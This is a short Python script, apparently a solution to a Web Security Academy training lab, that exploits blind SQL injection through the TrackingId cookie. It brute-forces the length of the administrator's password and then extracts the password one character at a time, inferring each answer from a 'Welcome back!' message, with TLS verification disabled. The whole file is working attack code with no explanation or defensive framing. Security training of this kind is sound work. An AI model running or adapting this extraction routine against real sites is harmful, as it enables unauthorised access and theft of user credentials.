
# Blind SQL injection with conditional responses
# Vulnerability in TrackingId cookie

import requests
import urllib3
import urllib
import string
import sys
# from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = 'https://0af0008303b50f08c0b6094c00a50085.web-security-academy.net/login'

# Getting Cookies
r = requests.get(url, verify=False)
cookies = r.cookies.get_dict()


# Determining Password Length
pass_len = 0
print('[+] Finding Password Length...')
for i in range(1,100):
    payload = f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')={i}--"
    payload = urllib.parse.quote(payload)
    
    mal_cookies = cookies.copy()
    mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 
 
    r = requests.get(url, cookies=mal_cookies, verify=False)

    sys.stdout.write(f'\r{i}')
    sys.stdout.flush()
    if 'Welcome back!' in r.text:
        pass_len = i
        break


# Finding Password
print('\n[+] Finding Password For Administrator User...')
password = ''
chars = string.digits + string.ascii_letters
for i in range(1, pass_len + 1):
    for c in chars:
        payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{c}'--"
        payload = urllib.parse.quote(payload)

        mal_cookies = cookies.copy()
        mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 
    
        r = requests.get(url, cookies=mal_cookies, verify=False)

        sys.stdout.write(f'\r{password}{c}')
        sys.stdout.flush()
        if 'Welcome back!' in r.text:
            password += c
            break